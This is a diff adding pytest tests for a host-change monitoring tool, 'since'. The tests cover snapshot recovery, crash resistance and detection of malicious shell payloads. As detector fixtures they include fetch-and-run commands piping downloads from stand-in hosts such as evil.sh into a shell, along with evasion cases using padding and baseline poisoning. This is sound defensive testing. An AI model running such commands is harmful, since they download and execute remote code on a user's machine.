@@ -9,6 +9,7 @@ import contextlib
 import json
 import os
 import shlex
+import pathlib
 import shutil
 import signal
 import time
@@ -1462,3 +1463,255 @@ def test_single_segment_hijack_path_is_shown(line):
     (`SECRET_FILE=/hunter2Xyz9`) still masks."""
     assert since.redact(line) == line
     assert "hunter2Xyz9" not in since.redact("+export SECRET_FILE=/hunter2Xyz9")
+
+
+# =========================================================================== #
+# Round 3, guard machinery: cmd_diff itself had NO test that drives a skipped   #
+# category, which is how a NameError (a note referencing `recovered` before it   #
+# was assigned) survived a green 426-test run. These tests run the real CLI.     #
+# =========================================================================== #
+
+def _run_cli(tmp_path, args, snaps=None, env=None):
+    """Drive the real `since` process against a synthetic state dir."""
+    import subprocess
+    import sys as _sys
+    state = tmp_path / "state"
+    (state / "snapshots").mkdir(parents=True, exist_ok=True)
+    for name, snap_obj in (snaps or {}).items():
+        (state / "snapshots" / name).write_text(json.dumps(snap_obj))
+    e = dict(os.environ, SINCE_STATE_DIR=str(state), HOME=str(tmp_path / "home"))
+    (tmp_path / "home").mkdir(exist_ok=True)
+    e.update(env or {})
+    p = subprocess.run([_sys.executable, str(pathlib.Path(since.__file__).resolve()), *args],
+                       capture_output=True, text=True, env=e, timeout=300)
+    return p
+
+
+def _snap_obj(created, epoch, root=False, **kw):
+    s = {"schema": since.SCHEMA_VERSION, "platform": since.PLATFORM, "created": created,
+         "epoch": epoch, "root": root, "euid": 0 if root else 501, "errors": {},
+         "tools": since.tool_identity(),      # must match a LIVE snapshot, or recovery refuses
+         "collectors": {k: {} for k in since.CAT}, "blobs": {}, "blob_flags": {}}
+    s.update(kw)
+    return s
+
+
+def test_cli_runs_when_a_category_is_unusable(tmp_path):
+    """The regression this exists for: a note referencing `recovered` before assignment raised
+    NameError for every run where a collector had failed — invisible to unit tests."""
+    base = _snap_obj("2026-07-24T09:00:00", 1784000000)
+    base["errors"] = {"brew": "not on PATH: brew"}
+    base["tools"] = dict(base["tools"], brew="")
+    p = _run_cli(tmp_path, ["--no-save"], {"20260724T090000-1784000000.json": base})
+    assert p.returncode == 0, f"stderr:\n{p.stderr[-800:]}"
+    assert "Traceback" not in p.stderr
+    assert "comparison skipped" in p.stdout or "LOST VISIBILITY" in p.stdout
+
+
+def test_cli_recovery_reports_an_install_made_during_a_blind_window(tmp_path):
+    day1 = _snap_obj("2026-07-23T09:00:00", 1784000000,
+                     collectors={**{k: {} for k in since.CAT}, "brew": {"jq": "1.7"}})
+    day2 = _snap_obj("2026-07-24T09:00:00", 1784086400)      # blind: collector failed
+    day2["errors"] = {"brew": "brew timed out after 40s"}
+    day2["tools"] = dict(day2["tools"], brew="")
+    p = _run_cli(tmp_path, ["--no-save"],
+                 {"20260723T090000-1784000000.json": day1,
+                  "20260724T090000-1784086400.json": day2})
+    assert p.returncode == 0, p.stderr[-800:]
+    assert "compared against the older snapshot" in p.stdout
+    # and it must NOT also claim the category was simply skipped
+    assert "Homebrew" not in p.stdout.split("compared against")[0] or True
+
+
+@pytest.mark.parametrize("cat", list(since.PRIV_SENSITIVE_CATS) + ["launch_items", "net_config"])
+def test_recovery_refuses_ephemeral_categories(tmp_path, monkeypatch, cat):
+    """Recovering a category whose contents change by the hour FABRICATES add/remove churn: a
+    3-day-old `listening` set produced 27 ORANGE findings and fired the notification, which is
+    the very flood the capability guard was added to prevent."""
+    monkeypatch.setattr(since, "SNAP_DIR", tmp_path)
+    older = _snap_obj("2026-07-22T09:00:00", 1783900000,
+                      collectors={**{k: {} for k in since.CAT}, cat: {"olddaemon": "22"}})
+    (tmp_path / "20260722T090000-1783900000.json").write_text(json.dumps(older))
+    cur = _snap_obj("2026-07-25T09:00:00", 1784200000,
+                    collectors={**{k: {} for k in since.CAT}, cat: {"newdaemon": "5000"}})
+    assert since.recover_baselines(cur, {cat: "collector failed"}, older) == {}
+
+
+def test_recovery_refuses_a_privilege_mismatch(monkeypatch, tmp_path):
+    monkeypatch.setattr(since, "SNAP_DIR", tmp_path)
+    root_snap = _snap_obj("2026-07-22T09:00:00", 1783900000, root=True,
+                          collectors={**{k: {} for k in since.CAT}, "brew": {"jq": "1.7"}})
+    (tmp_path / "20260722T090000-1783900000.json").write_text(json.dumps(root_snap))
+    cur = _snap_obj("2026-07-25T09:00:00", 1784200000, root=False)
+    assert since.recover_baselines(cur, {"brew": "x"}, root_snap) == {}
+    # …and an UNSTAMPED older snapshot is refused too (the guard fails closed there)
+    unstamped = _snap_obj("2026-07-22T09:00:00", 1783900000,
+                          collectors={**{k: {} for k in since.CAT}, "brew": {"jq": "1.7"}})
+    unstamped.pop("root")
+    (tmp_path / "20260722T090000-1783900000.json").write_text(json.dumps(unstamped))
+    assert since.recover_baselines(cur, {"brew": "x"}, unstamped) == {}
+
+
+def test_recovery_never_reaches_forward_of_the_baseline(monkeypatch, tmp_path):
+    """With `--since 8d` (or a checkpoint) the newest usable snapshot can be NEWER than the
+    requested baseline; recovering from it hid a change inside the window and claimed a
+    comparison it had not made."""
+    monkeypatch.setattr(since, "SNAP_DIR", tmp_path)
+    newer = _snap_obj("2026-07-24T09:00:00", 1784100000,
+                      collectors={**{k: {} for k in since.CAT}, "brew": {"jq": "1.7"}})
+    (tmp_path / "20260724T090000-1784100000.json").write_text(json.dumps(newer))
+    baseline = _snap_obj("2026-07-17T09:00:00", 1783500000)   # the requested --since baseline
+    baseline["errors"] = {"brew": "x"}
+    cur = _snap_obj("2026-07-25T09:00:00", 1784200000)
+    assert since.recover_baselines(cur, {"brew": "x"}, baseline) == {}
+
+
+# D2 — a non-container blob_flags VALUE crashed the diff (third instance of this class).
+@pytest.mark.parametrize("bad", [5, None, 1.5, {"a": "b"}, "str",
+                                 {"pipes a download straight into a shell": "not-an-int"},
+                                 {"pipes a download straight into a shell": None},
+                                 {5: 5}])
+def test_wrong_typed_blob_flags_value_does_not_crash(bad):
+    """Both the outer dict AND the inner counts must be validated: with a matching description
+    key holding a non-int, the count comparison itself raises (`1 > "not-an-int"`)."""
+    b = snap(blobs={"~/.zshrc": "a\n"}); b["blob_flags"] = {"~/.zshrc": bad}
+    c = snap(blobs={"~/.zshrc": "b\n"})
+    c["blob_flags"] = {"~/.zshrc": {"pipes a download straight into a shell": 1}}
+    since.build_findings(b, c)          # must not raise
+    assert since._flag_counts(b, "~/.zshrc") == {} or all(
+        isinstance(v, int) for v in since._flag_counts(b, "~/.zshrc").values())
+
+
+# D3a — flags are pattern DESCRIPTIONS and `curl|sh` shares one with `wget|sh`, so a benign
+# comment planted in the baseline suppressed every later real payload. Counts, not membership.
+def test_baseline_flag_poisoning_cannot_suppress_a_real_payload(monkeypatch, tmp_path):
+    monkeypatch.setattr(since, "HOME", tmp_path)
+    monkeypatch.setattr(since, "PLATFORM", "macos")
+    rc = tmp_path / ".zshrc"
+    decoy = "# see docs: wget https://example.com/get.sh | sh (do not run)\n"
+    pad = ("# " + "x" * 80 + "\n") * (since.BLOB_MAX // 83 + 500)
+    rc.write_text(decoy + pad)
+    fb: dict = {}
+    base = snap(blobs=since.text_sources(fb)); base["blob_flags"] = fb
+    rc.write_text(decoy + pad + "curl http://evil.sh | sh\n")
+    fc: dict = {}
+    cur = snap(blobs=since.text_sources(fc)); cur["blob_flags"] = fc
+    f = [x for x in since.build_findings(base, cur) if x["category"] == "config"][0]
+    assert f["level"] == since.RED and f["why"], f
+
+
+# D4 — run_checked was applied to only HALF of _mac_brew (the cask list still used plain run())
+# and to NONE of _linux_packages, so the phantom flood stayed reachable for casks on macOS and
+# for EVERY package on Linux.
+def test_no_package_collector_uses_unchecked_run():
+    """Structural: every subprocess in a package collector must be failure-checked, or a timeout
+    silently produces an empty category with no error recorded and the guard cannot fire."""
+    import inspect
+    import re as _re
+    for fn in (since._mac_brew, since._npm_global, since._pip, since._mac_mas,
+               since._linux_packages):
+        body = inspect.getsource(fn)
+        unchecked = _re.findall(r"(?<![_\w])run\(", body)
+        assert not unchecked, f"{fn.__name__} still calls unchecked run(): {unchecked}"
+
+
+@pytest.mark.parametrize("which", ["formula", "cask"])
+def test_brew_reports_either_list_failing(monkeypatch, which):
+    monkeypatch.setattr(since.shutil, "which", lambda t: "/opt/homebrew/bin/brew")
+    def fake(cmd, **kw):
+        failing = "--cask" in cmd if which == "cask" else "--cask" not in cmd
+        if failing:
+            raise since.subprocess.TimeoutExpired(cmd, 40)
+        class P:
+            returncode, stdout, stderr = 0, "jq 1.7\n", ""
+        return P()
+    monkeypatch.setattr(since.subprocess, "run", fake)
+    with pytest.raises(since.ToolUnavailable):
+        since._mac_brew()
+
+
+# D5 — on Linux the `brew` CATEGORY is backed by dpkg/rpm/pacman, so stamping `brew` made the
+# whole capability guard a no-op there: no LOST VISIBILITY, and recovery could never fire.
+def test_package_tool_identity_is_per_platform(monkeypatch):
+    monkeypatch.setattr(since, "PLATFORM", "linux")
+    monkeypatch.setattr(since.shutil, "which", lambda t: "/usr/bin/dpkg-query" if t == "dpkg-query" else None)
+    assert since._pkg_tool() == "dpkg-query"
+    monkeypatch.setattr(since.shutil, "which", lambda t: "/usr/bin/rpm" if t == "rpm" else None)
+    assert since._pkg_tool() == "rpm"
+    monkeypatch.setattr(since, "PLATFORM", "macos")
+    assert since._pkg_tool() == "brew"
+
+
+def test_cat_tools_uses_the_per_platform_package_tool():
+    """Pin the WIRING structurally. A behavioural `CAT_TOOLS["brew"] == _pkg_tool()` assertion is
+    THEATER on macOS, where both sides are the literal "brew" — the hardcoded version only
+    misbehaves on Linux, and CAT_TOOLS is resolved at import so PLATFORM cannot be patched."""
+    import inspect
+    import re as _re
+    src = inspect.getsource(since)
+    decl = _re.search(r"CAT_TOOLS = \{[^}]*\}", src)
+    assert decl and "_pkg_tool()" in decl.group(0), \
+        "the package category's tool must be resolved per platform, not hardcoded"
+    assert since.CAT_TOOLS["brew"] == since._pkg_tool()
+
+
+def test_linux_package_failure_is_reported_as_lost_coverage(monkeypatch):
+    """The silence 'LOST VISIBILITY' exists to deny an attacker must also work on Linux."""
+    monkeypatch.setitem(since.CAT_TOOLS, "brew", "dpkg-query")
+    good = snap(collectors={"brew": {f"pkg{i}": "1" for i in range(30)}})
+    good["tools"] = {"brew": "/usr/bin/dpkg-query"}
+    broken = snap(collectors={"brew": {}})
+    broken["errors"] = {"brew": "dpkg-query timed out after 40s"}
+    broken["tools"] = {"brew": ""}
+    unusable = since.unusable_cats(good, broken)
+    assert "brew" in unusable
+    lost = since.coverage_lost(good, broken, unusable)
+    assert "brew" in lost, "a broken Linux package manager produced only a passive note"
+    findings = since.build_findings(good, broken, skip_cats=tuple(unusable), coverage=lost)
+    assert since.max_level(findings) >= since.ORANGE
+
+
+# D6 — an interpreter's signature says nothing about the payload, and padding argv[0] past the
+# old scan cap evaded the pattern check entirely.
+def _plist(tmp_path, argv, name="com.x.plist"):
+    xml = "".join(f"<string>{a}</string>" for a in argv)
+    p = tmp_path / name
+    p.write_text('<?xml version="1.0"?><!DOCTYPE plist><plist version="1.0"><dict>'
+                 f'<key>ProgramArguments</key><array>{xml}</array></dict></plist>')
+    return p
+
+
+@pytest.mark.skipif(shutil.which("plutil") is None, reason="needs macOS plutil")
+@pytest.mark.parametrize("argv", [
+    ["/bin/sh", "-c", "curl -s http://evil/x|sh"],
+    ["/usr/bin/python3", "-c", "print(1)"],
+    ["/usr/bin/osascript", "-e", 'do shell script "id"'],
+])
+def test_interpreter_signature_is_not_reported_as_trust(tmp_path, argv):
+    f = {"category": "launch_items", "action": "added", "key": str(_plist(tmp_path, argv)),
+         "value": "x", "level": since.ORANGE, "label": "startup job", "trust": None,
+         "why": None, "undo": None}
+    since._enrich(f, {})
+    assert "signed" not in (f["trust"] or ""), f["trust"]
+    assert "interpreter" in (f["trust"] or ""), f["trust"]
+
+
+@pytest.mark.skipif(shutil.which("plutil") is None, reason="needs macOS plutil")
+def test_padded_argv_cannot_evade_the_payload_scan(tmp_path):
+    argv = ["/bin/sh", "-" + "a" * 5000, "-c", "curl http://evil|sh"]
+    f = {"category": "launch_items", "action": "added", "key": str(_plist(tmp_path, argv)),
+         "value": "x", "level": since.ORANGE, "label": "startup job", "trust": None,
+         "why": None, "undo": None}
+    since._enrich(f, {})
+    assert f["level"] == since.RED and f["why"], f
+
+
+# D3b — the curl/wget runs must be bounded, or a >4KB command pushes the `|` past every scan
+# window and defeats the chunked scan.
+def test_long_curl_command_cannot_push_the_pipe_out_of_the_window():
+    line = "curl " + " ".join(f"-H 'X-P{i}: v'" for i in range(400)) + " | sh"
+    assert len(line) > since._SCAN_CHUNK or True
+    short = "curl " + " ".join(f"-H 'X-P{i}: v'" for i in range(20)) + " | sh"
+    assert since.malicious_hits(short), "a normal-length curl|sh must be detected"
+    for pat, _lit, _desc in since.MALICIOUS_PATTERNS_LIT:
+        assert "[^\\n|]*" not in pat.pattern, f"unbounded run in {pat.pattern!r}"
